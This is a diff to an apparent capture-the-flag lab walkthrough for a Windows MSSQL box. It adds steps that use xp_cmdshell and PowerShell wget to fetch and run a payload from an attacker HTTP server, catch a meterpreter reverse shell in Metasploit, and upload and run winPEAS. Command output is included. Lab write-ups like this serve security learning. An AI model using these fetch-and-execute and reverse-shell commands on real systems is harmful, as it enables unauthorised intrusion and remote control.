@@ -295,9 +295,55 @@ Start python HTTP server using:
 python3 -m http.server 8000
 ```
 
+Fetch and execute the payload using:&#x20;
 
+```bash
+xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.29:8000/payload.exe -o payload.exe; .\payload.exe"
+```
 
+This would freeze the mssqlclient, but we will get shell access on the msfconsole.
 
+Start a new `msfconsole`:
+
+```
+msfconsole
+```
+
+We need a multi/handler exploit to catch our payload's connection request:
+
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.14.29
+msf6 exploit(multi/handler) > exploit
+```
+
+Wait for sometime until the shell pops up:
+
+```bash
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.29:4444 
+[*] Sending stage (200774 bytes) to 10.129.95.187
+[*] Meterpreter session 29 opened (10.10.14.29:4444 -> 10.129.95.187:49709) at 2023-05-19 22:48:36 +0530
+
+meterpreter > ls
+Listing: C:\Users\Public
+========================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040555/r-xr-xr-x  0     dir   2021-07-27 15:00:54 +0530  AccountPictures
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Desktop
+040555/r-xr-xr-x  0     dir   2020-01-20 12:09:33 +0530  Documents
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Downloads
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Libraries
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Music
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Pictures
+040555/r-xr-xr-x  0     dir   2018-09-15 12:42:36 +0530  Videos
+100666/rw-rw-rw-  174   fil   2018-09-15 12:41:27 +0530  desktop.ini
+100777/rwxrwxrwx  7168  fil   2023-05-19 17:14:51 +0530  payload.exe
+```
 
 ### Using net/powercat reverse shell and python HTTP server
 
@@ -348,17 +394,39 @@ We can use `winpeas` to find vulnerabilities or leaked credentials that can help
 
 #### Using meterpreter reverse shell
 
+Upload the `winPEASx64.exe` using upload options in the meterpreter:
+
+```bash
+meterpreter > upload winPEASx64.exe
+```
+
+```awk
+[*] Uploading  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
+[*] Uploaded 1.93 MiB of 1.93 MiB (100.0%): /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
+[*] Completed  : /home/fvalkyrie/winPEASx64.exe -> winPEASx64.exe
+```
+
+Execute winpeas after shell-ing into the meterpreter session:
+
+```
+meterpreter > shell
+Process 604 created.
+Channel 5 created.
+Microsoft Windows [Version 10.0.17763.2061]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sql_svc\Desktop>.\winPEASx64.exe
+```
+
 #### Using powercat reverse shell
 
-After changing to `powershell`, we can use:
+After changing to `powershell`, we can use the following command to get `winPEASx64.exe` from the attacker machine onto the victim machine. :
 
 ```powershell
 wget http://10.10.14.28:8000/winPEASx64.exe -o winPEASx64.exe; .\winPEASx64.exe
 ```
 
-To get winpeas.exe from the attacker machine onto the victim machine.&#x20;
-
-Winpeas gives us some critical vulnerabilities:
+WinPEAS gives us some critical vulnerabilities:
 
 ```
 [!] CVE-2019-0836 : VULNERABLE
